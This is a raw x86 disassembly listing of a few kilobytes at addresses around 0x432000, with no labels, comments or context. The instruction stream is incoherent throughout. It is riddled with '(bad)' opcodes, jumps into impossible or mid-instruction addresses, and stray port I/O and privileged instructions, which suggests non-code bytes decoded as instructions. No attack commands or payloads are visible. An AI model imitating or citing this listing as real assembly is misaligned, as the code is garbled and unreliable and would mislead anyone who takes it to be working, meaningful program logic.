  431ff0:	sar    ebp,0xb
  431ff3:	jmp    FWORD PTR [edi+0x2400392a]
  431ff9:	sub    esi,DWORD PTR [ebx-0x73]
  431ffc:	mov    esp,DWORD PTR [ecx+edi*4]
  431fff:	mov    ecx,DWORD PTR [eax]
  432001:	and    BYTE PTR [eax],al
  432003:	jne    0x431fcf
  432005:	sub    ebp,ecx
  432007:	sbb    BYTE PTR [esi+0x32],ah
  43200a:	dec    ebp
  43200b:	push   ebp
  43200c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  432012:	ret    
  432013:	mov    edx,ebp
  432015:	leave  
  432016:	sub    DWORD PTR [esi+0x24],ebx
  432019:	ret    0x2b
  43201c:	pop    ax
  43201e:	push   ebp
  43201f:	rol    BYTE PTR [ebx],0xeb
  432022:	add    DWORD PTR [ecx+0x6c0001],0x40
  432029:	jb     0x432080
  43202b:	ret    
  43202c:	in     al,dx
  43202d:	jecxz  0x431fba
  43202f:	push   esi
  432030:	xchg   esp,eax
  432031:	jne    0x432033
  432033:	cmp    edx,DWORD PTR [esi+0x1c]
  432036:	jne    0x43201c
  432038:	mov    eax,DWORD PTR [ebp-0x77]
  43203b:	ror    DWORD PTR [ebx+0x899408],0xe0
  432042:	mov    esi,DWORD PTR [ebp-0x75]
  432045:	pop    esi
  432046:	nop
  432047:	mov    eax,DWORD PTR [eax]
  432049:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  43204f:	add    al,0x0
  432051:	inc    ebp
  432052:	mov    eax,DWORD PTR [ebx]
  432054:	mov    ebp,ebx
  432056:	cmp    al,0xf
  432058:	or     al,al
  43205a:	inc    ebp
  43205b:	inc    ebp
  43205c:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  432064:	mov    bh,0xc0
  432066:	push   ss
  432067:	ins    BYTE PTR es:[edi],dx
  432068:	push   ecx
  432069:	add    BYTE PTR [ecx-0x5],dl
  43206c:	add    eax,0x17200
  432071:	sbb    al,0x85
  432073:	dec    esp
  432074:	je     0x4320ae
  432076:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43207a:	add    BYTE PTR [ebx],bh
  43207c:	(bad)  
  43207d:	and    al,0x39
  43207f:	jae    0x43201d
  432081:	mov    cl,cl
  432083:	inc    DWORD PTR [esp]
  432086:	push   ebp
  432087:	shr    esp,0x8
  43208a:	in     al,dx
  43208b:	push   esp
  43208c:	add    DWORD PTR [eax],esp
  43208e:	add    bl,cl
  432090:	inc    ebp
  432091:	mov    bh,0x89
  432093:	add    ah,bh
  432095:	jmp    0xca7c2fdf
  43209a:	pushf  
  43209b:	dec    esp
  43209c:	mov    edx,0xf8178520
  4320a1:	fst    DWORD PTR [ebp+0x0]
  4320a4:	mov    BYTE PTR [eax],0xc4
  4320a7:	sub    edx,DWORD PTR [ebx-0x3f]
  4320aa:	inc    ebp
  4320ab:	add    eax,0xc601da
  4320b0:	mov    al,0xc6
  4320b3:	ins    BYTE PTR es:[edi],dx
  4320b4:	mov    DWORD PTR [eax+0x57],0x280545c1
  4320bb:	dec    esp
  4320bc:	jmp    DWORD PTR [eax]
  4320be:	inc    ebp
  4320bf:	fnstcw WORD PTR [esi+0x29]
  4320c2:	test   BYTE PTR [eax],0xc6
  4320c5:	rol    BYTE PTR [eax],0xc0
  4320c8:	lea    ecx,[ebp-0x3cf0dbcb]
  4320ce:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4320d4:	inc    esi
  4320d5:	add    DWORD PTR [eax],ebx
  4320d7:	add    dh,bh
  4320d9:	mov    esi,DWORD PTR [edx+0x8]
  4320dc:	(bad)  
  4320dd:	fdiv   QWORD PTR ss:[ecx]
  4320e0:	(bad)  
  4320e1:	mov    bl,ch
  4320e3:	add    esi,eax
  4320e5:	add    dh,bl
  4320e7:	or     esi,eax
  4320e9:	mov    dl,0xdf
  4320eb:	add    esi,eax
  4320ed:	add    al,ah
  4320ef:	push   cs
  4320f0:	mov    BYTE PTR [edx+0xc601e1],0xe2
  4320f7:	or     BYTE PTR [ebx],dh
  4320f9:	dec    ecx
  4320fa:	lea    eax,[ebx]
  4320fc:	xor    eax,0x18fc0fc7
  432101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432102:	repz clc 
  432104:	add    eax,DWORD PTR [ebp+0x46]
  432107:	prefetcht0 BYTE PTR [ecx-0x2]
  43210b:	xor    eax,0x7c60872
  432110:	mov    esp,0xbd32c699
  432115:	pop    esi
  432116:	mov    cl,0xbe
  432119:	or     al,0xc6
  43211b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  432122:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  432129:	add    dh,al
  43212b:	mov    eax,ebx
  43212d:	xor    DWORD PTR [ebx],0x35008dbc
  432133:	mov    ecx,DWORD PTR [edi]
  432135:	sbb    al,0x18
  432137:	inc    ebp
  432138:	xrelease mov DWORD PTR [ebx],0x188546f4
  43213f:	clc    
  432140:	(bad)  
  432141:	ss jb  0x4320e0
  432144:	lea    ecx,[ecx+0x45ffe838]
  43214a:	mov    ebp,esp
  43214c:	fadd   st,st(6)
  43214e:	dec    ebp
  43214f:	lds    edi,FWORD PTR [eax+0x7145fc56]
  432155:	out    0x1,eax
  432157:	inc    ebp
  432158:	lea    ebp,[ecx]
  43215a:	inc    esi
  43215c:	dec    eax
  43215e:	enter  0xa33,0xc6
  432162:	push   ebp
  432163:	leave  
  432164:	(bad)  
  432165:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43216b:	add    BYTE PTR [ebp+0x44],al
  43216e:	mov    eax,esp
  432170:	mov    WORD PTR [esi+0x44398300],?
  432176:	psubusw mm4,QWORD PTR [eax-0x78]
  43217a:	add    BYTE PTR [ebx-0x1303f975],al
  432180:	add    BYTE PTR [ebp+0x1],0xeb
  432184:	add    BYTE PTR [ebp+0x38],al
  432187:	jmp    0xdbce66d1
  43218c:	add    BYTE PTR [ebp+0x0],0xe8
  432190:	mov    DWORD PTR [ebp-0x48],eax
  432193:	sub    DWORD PTR [edi+0x45],ecx
  432196:	add    BYTE PTR [eax],ch
  432198:	js     0x4321df
  43219a:	data16 jle 0x432122
  43219d:	idiv   bh
  43219f:	inc    esp
  4321a0:	(bad)  
  4321a1:	fadd   st(7),st
  4321a3:	mov    dh,0x89
  4321a5:	and    DWORD PTR [esi+0x44],0xffffffff
  4321a9:	fld    DWORD PTR [ebx-0x767cbc78]
  4321af:	pop    es
  4321b0:	push   0x8d45ffec
  4321b5:	jmp    0xe6cc66bd
  4321ba:	push   0x45
  4321bc:	jmp    edx
  4321be:	add    DWORD PTR [ebp+0xd],0xfffffff5
  4321c2:	mov    DWORD PTR [ebp+0x6c],eax
  4321c5:	(bad)  
  4321c7:	inc    ebp
  4321c8:	(bad)  
  4321c9:	out    dx,al
  4321ca:	add    al,0x45
  4321cc:	mov    edi,esp
  4321ce:	outs   dx,BYTE PTR ds:[esi]
  4321cf:	inc    ebp
  4321d0:	(bad)  
  4321d1:	jle    0x432156
  4321d3:	idiv   BYTE PTR ds:0x70bc8944
  4321d9:	mov    dh,0xff
  4321db:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  4321e2:	jb     0x432167
  4321e4:	dec    DWORD PTR [eax]
  4321e6:	mov    ebp,esp
  4321e8:	test   WORD PTR [ebp-0x1],ax
  4321ef:	inc    ebp
  4321f0:	ror    BYTE PTR [ebx-0x137a279a],0xff
  4321f7:	adc    edi,edi
  4321f9:	mov    ebp,edi
  4321fb:	mov    eax,DWORD PTR [eax]
  4321fd:	cmp    BYTE PTR [esi-0x1],ah
  432200:	test   DWORD PTR [ebx],edi
  432202:	push   DWORD PTR [ebp-0x1]
  432205:	mov    DWORD PTR [esi-0x48],ebp
  432208:	add    BYTE PTR [ebp+0x66],al
  43220b:	jmp    0x432192
  43220d:	pushf  
  43220e:	dec    DWORD PTR [ebx-0x7f940301]
  432214:	add    BYTE PTR [ecx],al
  432216:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43221d:	add    al,al
  43221f:	add    BYTE PTR [esi+0x45],ah
  432222:	test   DWORD PTR [ebx+0xff7cff],ecx
  432228:	inc    eax
  432229:	mov    DWORD PTR [eax],eax
  43222b:	mov    esp,DWORD PTR [esi-0x4]
  43222e:	inc    ebp
  43222f:	cmp    BYTE PTR [eax+0x4701],0x38
  432236:	mov    DWORD PTR [ebp-0x7e],ebp
  432239:	add    BYTE PTR [edi-0x73],al
  43223c:	push   0xffffffcd
  43223e:	mov    WORD PTR [ebp+0x64],ax
  432242:	(bad)  
  432243:	call   eax
  432245:	mov    esp,esi
  432247:	data16 cmc 
  432249:	test   DWORD PTR [ebp-0x1],eax
  43224c:	(bad)  
  43224e:	out    0xc0,eax
  432250:	lea    esp,[esi-0x30]
  432253:	test   DWORD PTR [edx+0x44ff80ff],ecx
  432259:	inc    edi
  43225a:	jmp    0x75ff:0x40858866
  432261:	dec    DWORD PTR [ebp-0x7a992f40]
  432267:	test   esi,edi
  432269:	(bad)  
  43226a:	(bad)  
  43226b:	inc    DWORD PTR [ebp-0x9901b9]
  432271:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  432277:	rcl    BYTE PTR [ecx+0x66],0x33
  43227b:	test   DWORD PTR [ebx+0xff72ff],edi
  432281:	inc    edi
  432282:	ret    
  432283:	mov    ax,WORD PTR [ebp-0x3f0004]
  43228a:	push   eax
  43228b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432292:	add    BYTE PTR [ebx-0x764f0839],al
  432298:	push   DWORD PTR [esi+0x1]
  43229b:	inc    DWORD PTR [eax]
  43229d:	mov    eax,0xff99ff
  4322a2:	or     BYTE PTR [ecx-0x7a87bb],cl
  4322a8:	jne    0x432262
  4322aa:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  4322b4:	mov    ecx,0xd74fb8
  4322b9:	add    cl,al
  4322bb:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4322c1:	or     DWORD PTR [ebx+0x558966e4],0x7e
  4322c8:	(bad)  
  4322c9:	(bad)  
  4322ca:	std    
  4322cb:	mov    eax,0x8c2789
  4322d0:	ret    0x6689
  4322d3:	adc    BYTE PTR [ebp+0x40],0x8d
  4322d7:	add    bh,ah
  4322d9:	mov    WORD PTR [ebp-0x70],ax
  4322dd:	(bad)  
  4322de:	ret    0x6605
  4322e1:	or     BYTE PTR [ebp-0x77],dl
  4322e4:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  4322eb:	loop   0x432276
  4322ed:	(bad)  
  4322ee:	xchg   esi,eax
  4322ef:	aam    0xcf
  4322f1:	out    dx,al
  4322f2:	mov    DWORD PTR [esi-0x68],edi
  4322f5:	inc    ebp
  4322f6:	dec    edx
  4322f7:	pop    ecx
  4322f8:	mov    edx,DWORD PTR [eax]
  4322fa:	repnz push bp
  4322fd:	or     BYTE PTR [ebx+0x5510663a],0x49
  432304:	(bad)  
  432305:	repnz cmp eax,0xa0898945
  43230b:	mov    ah,0x89
  43230d:	jmp    DWORD PTR [edx+0x66b0418d]
  432313:	inc    DWORD PTR [ebp+0x50]
  432316:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43231a:	mov    DWORD PTR [eax],ecx
  43231c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43231d:	pop    es
  43231e:	inc    ecx
  43231f:	(bad)  
  432320:	cwd    
  432322:	inc    ebp
  432323:	xor    ah,BYTE PTR [esi+0x3]
  432326:	dec    ebp
  432327:	push   eax
  432328:	inc    bp
  43232a:	jge    0x4322af
  43232c:	mov    esp,DWORD PTR [esi-0x18]
  43232f:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  432335:	add    DWORD PTR [ebx],esi
  432337:	add    BYTE PTR [ebx],al
  432339:	test   DWORD PTR [ebx],esi
  43233b:	(bad)  
  43233c:	inc    WORD PTR [ebp+0x0]
  432340:	mov    eax,DWORD PTR [eax]
  432342:	call   0x8898da77
  432347:	mov    esi,eax
  432349:	clc    
  43234a:	ret    
  43234b:	rol    cl,0xa
  43234e:	mov    DWORD PTR ds:0x7c0ec88,esi
  432354:	mov    edx,edi
  432356:	pushf  
  432357:	pop    es
  432358:	jmp    DWORD PTR [edx+0x66]
  43235b:	add    BYTE PTR [ebp-0x990175],al
  432361:	inc    ebp
  432362:	test   DWORD PTR [ebx-0x2f00ea02],eax
  432368:	push   ebp
  432369:	mov    edi,eax
  43236b:	mov    dh,BYTE PTR [eax+0x266ff51]
  432371:	push   ebp
  432372:	add    BYTE PTR [ebx-0x764b0777],al
  432378:	dec    DWORD PTR [esi+0x661851e8]
  43237e:	add    BYTE PTR [ebp-0x7b],dl
  432381:	cmp    esi,0x3
  432384:	dec    DWORD PTR [ecx+0x51fe9285]
  43238a:	jmp    DWORD PTR [esi-0x75]
  43238d:	push   ebp
  43238e:	hlt    
  43238f:	data16 (bad) 
  432391:	dec    ebp
  432392:	ret    
  432393:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432399:	lea    edx,[eax-0x1]
  43239c:	jne    0x43236f
  43239e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4323a4:	dec    BYTE PTR [ecx+0x51559eff]
  4323aa:	mov    DWORD PTR [esi-0x4c],esp
  4323ad:	push   ebp
  4323ae:	jmp    DWORD PTR [esi-0x18]
  4323b1:	inc    ebp
  4323b2:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4323b8:	(bad)  
  4323b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4323ba:	inc    eax
  4323bc:	test   DWORD PTR [esi-0x2],esp
  4323bf:	inc    ebp
  4323c0:	dec    DWORD PTR [ebp-0x760bde75]
  4323c6:	(bad)  
  4323c7:	test   al,0xc3
  4323c9:	mov    DWORD PTR [ebp-0x769b56],ecx
  4323cf:	lods   al,BYTE PTR ds:[esi]
  4323d0:	push   eax
  4323d1:	inc    ebp
  4323d2:	jne    0x4323e3
  4323d4:	dec    DWORD PTR [ebp+0x8]
  4323d7:	mov    eax,DWORD PTR [edi]
  4323d9:	sbb    al,0x0
  4323db:	(bad)  
  4323dc:	mov    eax,0xc14fc3
  4323e1:	mov    DWORD PTR [eax-0x64],edi
  4323e4:	inc    bp
  4323e6:	test   DWORD PTR [edi],ecx
  4323e8:	dec    DWORD PTR [ebp-0x1]
  4323eb:	xor    eax,edi
  4323ed:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4323f3:	inc    ebp
  4323f4:	xor    DWORD PTR [ebx],0x43
  4323f7:	mov    WORD PTR [ebp-0x1bc],ax
  4323fe:	lea    ecx,[ecx-0x7677fe]
  432404:	inc    esi
  432405:	(bad)  
  432406:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43240d:	pushf  
  43240e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432415:	add    bh,bh
  432417:	add    BYTE PTR [edi],cl
  432419:	test   DWORD PTR [eax],eax
  43241b:	(bad)  
  43241c:	dec    WORD PTR [ebp-0xff002d]
  432423:	mov    DWORD PTR [eax-0x48],esi
  432426:	add    bh,bh
  432428:	lea    cx,[ebp-0x50]
  43242f:	push   eax
  432430:	rol    BYTE PTR [ebp+0x0],1
  432433:	xor    esp,DWORD PTR [esi+0x3]
  432436:	lea    edx,[eax-0x1]
  432439:	test   edi,edi
  43243b:	dec    DWORD PTR [ebp-0x1]
  43243e:	mov    edi,edi
  432440:	dec    eax
  432441:	clc    
  432442:	call   DWORD PTR [ebp-0x73]
  432445:	lea    esi,[eax+0x51ffff88]
  43244b:	lea    ecx,[ebp-0x78]
  43244e:	test   WORD PTR [ebp-0x2],ax
  432455:	popf   
  432456:	push   ecx
  432457:	add    BYTE PTR [ecx-0x77],dl
  43245a:	xor    edi,DWORD PTR [eax-0x724a007d]
  432460:	cdq    
  432461:	mov    al,0x32
  432463:	inc    DWORD PTR [ebx]
  432465:	push   eax
  432466:	push   ecx
  432467:	inc    ebp
  432468:	shl    BYTE PTR [ebx],1
  43246a:	lea    eax,[ebx]
  43246c:	call   DWORD PTR [eax-0x1]
  43246f:	test   DWORD PTR [ebx],esi
  432471:	inc    DWORD PTR [eax-0x1]
  432474:	(bad)  
  432475:	(bad)  
  432476:	(bad)  
  432477:	clc    
  432478:	call   DWORD PTR [ebp+0x50]
  43247b:	jmp    0xcc25f5
  432480:	inc    esp
  432481:	jae    0x432482
  432483:	add    BYTE PTR [ecx-0x384f73],cl
  432489:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43248f:	mov    eax,DWORD PTR [ecx]
  432491:	data16 add BYTE PTR [ebp-0xb50077],al
  432498:	inc    eax
  43249a:	lea    esp,[esi+0x1c]
  43249d:	test   DWORD PTR [ecx-0xb301],ecx
  4324a3:	inc    edi
  4324a4:	(bad)  
  4324a5:	dec    si
  4324a7:	test   edi,edi
  4324a9:	push   DWORD PTR [ecx]
  4324ab:	(bad)  
  4324ac:	jnp    0x4324fd
  4324ae:	(bad)  
  4324af:	mov    edx,DWORD PTR [edx-0x7d]
  4324b2:	(bad)  
  4324b3:	mov    ebx,0x563a8935
  4324b8:	(bad)  
  4324b9:	call   FWORD PTR [esi-0x47]
  4324bc:	inc    DWORD PTR ds:0x893000e2
  4324c2:	(bad)  
  4324c3:	pop    eax
  4324c4:	mov    ah,0xff
  4324c6:	(bad)  
  4324c7:	mov    ecx,0x5745
  4324cc:	dec    DWORD PTR [ecx-0xf7a501]
  4324d2:	(bad)  
  4324d3:	mov    ecx,0x456108
  4324d8:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4324de:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4324e4:	inc    BYTE PTR gs:[eax]
  4324e7:	inc    DWORD PTR [ebp-0x73]
  4324ea:	ss (bad) 
  4324ec:	pushf  
  4324ed:	inc    edi
  4324ef:	mov    ebx,eax
  4324f1:	hlt    
  4324f2:	test   DWORD PTR [ecx-0xbab708],ecx
  4324f8:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  4324fe:	lock into 
  432500:	test   eax,eax
  432502:	clc    
  432503:	mov    ebx,0x367245
  432508:	lahf   
  432509:	retf   
  43250a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432510:	add    edi,edi
  432512:	add    BYTE PTR [ecx+0x45],dl
  432515:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43251c:	mov    edx,DWORD PTR [ecx-0x74]
  43251f:	inc    DWORD PTR [eax]
  432521:	cld    
  432522:	mov    eax,DWORD PTR [ebp-0x6f0175]
  432528:	add    BYTE PTR [ebp-0x1b0177],al
  43252e:	jge    0x432575
  432530:	test   DWORD PTR [ebx+0xff9875],ecx
  432536:	sbb    BYTE PTR [esi+0x55],ah
  432539:	xchg   ebp,eax
  43253a:	call   0x43203e
  43253f:	push   edi
  432540:	inc    ebp
  432541:	mov    dx,WORD PTR [ebp-0xfc0075]
  432548:	cmp    al,0x85
  43254a:	ud0    eax,DWORD PTR [ebp-0x1]
  43254e:	test   DWORD PTR [edi+0x74],ecx
  432551:	dec    edi
  432552:	inc    DWORD PTR [ebp-0xf70004]
  432558:	dec    DWORD PTR [edi-0x75]
  43255b:	dec    edi
  43255c:	cld    
  43255d:	test   DWORD PTR [eax+0xff01ff],eax
  432563:	icebp  
  432564:	add    BYTE PTR [edi-0x3a],cl
  432567:	test   ebx,eax
  432569:	inc    BYTE PTR [ebp-0x1]
  43256c:	jne    0x43256e
  43256e:	mov    eax,DWORD PTR [eax]
  432570:	cld    
  432571:	xor    BYTE PTR [ecx+0x500155],cl
  432577:	push   ebp
  432578:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43257e:	add    BYTE PTR [ebp+0x35e90f50],al
  432584:	add    al,BYTE PTR [eax]
  432586:	add    BYTE PTR [ebx-0x38fe4f80],al
  43258c:	add    ah,ch
  43258e:	or     BYTE PTR [ebp+0x4501f845],dh
  432594:	jmp    0xdf288f
  432599:	(bad)  
  43259a:	nop    ecx
  43259d:	test   DWORD PTR [ebp+0x4502f8],eax
  4325a3:	cmp    BYTE PTR [ebp-0x64],cl
  4325a6:	mov    eax,edi
  4325a8:	mov    ebx,DWORD PTR [eax+edx*2]
  4325ab:	add    eax,0x45fef885
  4325b0:	dec    DWORD PTR [ebx+0x339445]
  4325b6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4325bc:	dec    DWORD PTR [ebx-0x460f0375]
  4325c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4325c3:	add    esi,edi
  4325c5:	add    bh,bh
  4325c7:	rdpmc  
  4325c9:	add    BYTE PTR [ebx],0x1
  4325cc:	mov    DWORD PTR [eax],eax
  4325ce:	add    al,0x45
  4325d0:	dec    DWORD PTR [ecx-0x360b3373]
  4325d6:	dec    DWORD PTR [esi]
  4325d8:	push   eax
  4325d9:	jne    0x432620
  4325db:	mov    esi,DWORD PTR [ebx]
  4325dd:	cld    
  4325de:	add    ebp,ebx
  4325e0:	push   eax
  4325e1:	inc    DWORD PTR [ebp-0x75]
  4325e4:	add    eax,0x800e4
  4325e9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4325ef:	mov    DWORD PTR [ecx],eax
  4325f1:	sbb    al,0x0
  4325f3:	leave  
  4325f4:	test   DWORD PTR [edi-0x2],eax
  4325f7:	jne    0x4325f8
  4325f9:	call   0xff4410fe
  4325fe:	xor    BYTE PTR [ebp+0x4d],al
  432601:	mov    edi,edi
  432603:	enter  0x8,0x4d
  432607:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43260d:	mov    eax,DWORD PTR [eax]
  43260f:	cld    
  432610:	add    DWORD PTR [ecx],ebx
  432612:	inc    ebp
  432613:	dec    ebp
  432614:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43261a:	inc    eax
  43261b:	dec    DWORD PTR [ecx-0x270375]
  432621:	add    BYTE PTR [ebx-0x39d72701],cl
  432627:	xchg   ecx,eax
  432628:	ret    
  432629:	add    BYTE PTR [ebp-0x830075],al
  43262f:	add    BYTE PTR [ebp-0x75],al
  432632:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  432638:	lea    edi,[edi-0xc]
  43263b:	add    bh,bh
  43263d:	mov    edx,DWORD PTR [eax-0x7b]
  432640:	inc    ebp
  432641:	rdpmc  
  432643:	jne    0x432648
  432645:	add    BYTE PTR [eax-0x75],dl
  432648:	inc    ebp
  432649:	clc    
  43264a:	add    eax,0x400009
  43264f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  432655:	mov    eax,DWORD PTR [ecx]
  432657:	in     al,dx
  432658:	add    dh,al
  43265a:	test   ebx,eax
  43265c:	inc    BYTE PTR [ebp-0xff0001]
  432662:	add    BYTE PTR [ebp-0x43],al
  432665:	cmp    esi,0xfffffff8
  432668:	(bad)  
  432669:	push   DWORD PTR [eax]
  43266b:	add    BYTE PTR [ebp-0x3a],dl
  43266e:	test   ebx,eax
  432670:	je     0x4325f7
  432672:	mov    edi,edi
  432674:	sbb    al,0xff
  432676:	test   DWORD PTR gs:[eax],eax
  432679:	(bad)  
  43267a:	js     0x43267b
  43267c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432682:	sub    eax,ebx
  432684:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43268a:	add    eax,DWORD PTR [eax]
  43268c:	dec    ebp
  43268d:	push   eax
  43268e:	mov    al,BYTE PTR [ebp+0x1]
  432691:	mov    eax,DWORD PTR [ebp-0x68]
  432694:	mov    eax,DWORD PTR [eax]
  432696:	sbb    bh,al
  432698:	or     ah,dh
  43269a:	dec    ebp
  43269b:	inc    DWORD PTR [eax+0x4]
  43269e:	push   ecx
  43269f:	add    BYTE PTR [edx-0x1],dh
  4326a2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4326a8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4326b2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4326b8:	push   ecx
  4326b9:	cmp    BYTE PTR [ebx],al
  4326bb:	inc    ebp
  4326bc:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4326c2:	(bad)  
  4326c3:	(bad)  
  4326c4:	in     al,0xff
  4326c6:	add    BYTE PTR [ebp+0x0],al
  4326c9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4326cf:	add    al,bh
  4326d1:	(bad)  
  4326d2:	jmp    0x8d85:0x74b0558d
  4326d9:	dec    DWORD PTR [eax]
  4326db:	call   DWORD PTR [ebp-0x7b]
  4326de:	mov    edi,esi
  4326e0:	lock call DWORD PTR [ebp-0x75]
  4326e4:	mov    esi,esp
  4326e6:	mov    ah,0xc6
  4326e8:	mov    bh,0xc3
  4326ea:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4326f0:	add    DWORD PTR [eax],0x450050ff
  4326f6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4326fc:	inc    edi
  4326fe:	push   esp
  432700:	jmp    0xcd00:0x670481ff
  432707:	mov    DWORD PTR [ebx],esi
  432709:	clc    
  43270a:	cmp    edi,0xff9cff3b
  432710:	jne    0x43271a
  432712:	mov    eax,eax
  432714:	add    esi,DWORD PTR [eax]
  432716:	int3   
  432717:	inc    ebp
  432718:	cmp    al,0x83
  43271a:	add    BYTE PTR [eax],bl
  43271c:	adc    DWORD PTR [ebx+0x768b5055],eax
  432722:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  432728:	mov    edi,eax
  43272a:	cmp    BYTE PTR [ebp+0x45],cl
  43272d:	jmp    0x4326ba
  43272f:	mov    ebx,DWORD PTR [esp+ebp*8]
  432732:	inc    ebp
  432733:	or     al,0x2
  432735:	dec    DWORD PTR [ebp+0x18]
  432738:	jne    0x43278f
  43273a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  432740:	mov    edi,DWORD PTR [ebx]
  432742:	in     al,0x50
  432744:	xchg   ecx,eax
  432745:	jmp    0x343764a
  43274a:	adc    al,0x8b
  43274c:	inc    ebp
  43274d:	mov    al,ds:0x8b04008b
  432752:	push   ebp
  432753:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  432759:	push   ebp
  43275a:	test   DWORD PTR [ebx-0x2800d701],ecx
  432760:	inc    ebp
  432761:	dec    ebp
  432762:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  432768:	mov    DWORD PTR [eax],0xe9ff00f4
  43276e:	add    al,0x0
  432770:	add    BYTE PTR [eax],al
  432772:	mov    eax,edx
  432774:	push   eax
  432775:	rol    DWORD PTR [ebp-0xf0177],1
  43277b:	bound  eax,QWORD PTR [ebp+0x50]
  43277e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432784:	add    BYTE PTR [ecx+0x558df0ff],cl
  43278a:	mov    al,0xf
  43278c:	test   DWORD PTR [edx],edx
  43278e:	call   DWORD PTR [ebp-0x7a0001]
  432794:	(bad)  
  432795:	loop   0x432796
  432797:	jnp    0xc6991b9d
  43279d:	mov    eax,ebx
  43279f:	cmp    al,0x8b
  4327a1:	(bad)  
  4327a2:	cld    
  4327a3:	shr    esi,0xc
  4327a6:	add    dl,al
  4327a8:	push   eax
  4327a9:	lea    eax,[ebp-0x1]
  4327ac:	mov    edx,esi
  4327ae:	cwde   
  4327af:	cli    
  4327b0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4327b6:	or     BYTE PTR [eax],cl
  4327b8:	inc    ebp
  4327b9:	dec    ebp
  4327ba:	inc    DWORD PTR [ebx+0x74803914]
  4327c0:	add    DWORD PTR [ebx+0x451800],ecx
  4327c6:	call   DWORD PTR [eax+edx*1]
  4327c9:	add    ecx,DWORD PTR [ebp-0x34]
  4327cc:	push   edi
  4327cd:	adc    al,0x8
  4327cf:	mov    edx,DWORD PTR [ebp-0x14]
  4327d2:	mov    ecx,DWORD PTR [ebp+0x18]
  4327d5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4327d9:	inc    DWORD PTR [eax+esi*8]
  4327dc:	inc    ebp
  4327dd:	stos   BYTE PTR es:[edi],al
  4327de:	mov    edx,DWORD PTR [ebp-0x4]
  4327e1:	add    DWORD PTR [ebp-0x1c],eax
  4327e4:	mov    edx,DWORD PTR [ebp-0x70]
  4327e7:	cmp    eax,DWORD PTR [eax]
  4327e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4327ea:	mov    eax,DWORD PTR [eax]
  4327ec:	cld    
  4327ed:	jae    0x43276f
  4327ef:	add    eax,DWORD PTR [ecx]
  4327f1:	clc    
  4327f2:	add    BYTE PTR [eax+0x30],dl
  4327f5:	mov    DWORD PTR [ecx],esi
  4327f7:	clc    
  4327f8:	pop    ds
  4327f9:	inc    ebp
  4327fa:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432800:	(bad)  
  432801:	push   DWORD PTR [edi]
  432803:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432809:	(bad)  
  43280a:	jae    0x43280b
  43280c:	mov    eax,DWORD PTR [ebp-0x740175]
  432812:	sub    eax,DWORD PTR [eax]
  432814:	add    eax,DWORD PTR [eax]
  432816:	mov    DWORD PTR [ecx+0x5f],eax
  432819:	mov    DWORD PTR [ebx-0x4],ebx
  43281c:	ret    0xff
  43281f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  432825:	ret    
  432826:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43282c:	add    BYTE PTR [ebp-0x7d],al
  43282f:	mov    DWORD PTR [eax],eax
  432831:	add    al,0x84
  432833:	inc    DWORD PTR [ecx]
  432835:	lea    eax,[eax]
  432837:	hlt    
  432838:	sar    bh,cl
  43283a:	test   BYTE PTR [eax+0x1],dl
  43283d:	inc    ebp
  43283e:	add    BYTE PTR [ebx],dh
  432840:	test   BYTE PTR [ebx],0x84
  432843:	push   eax
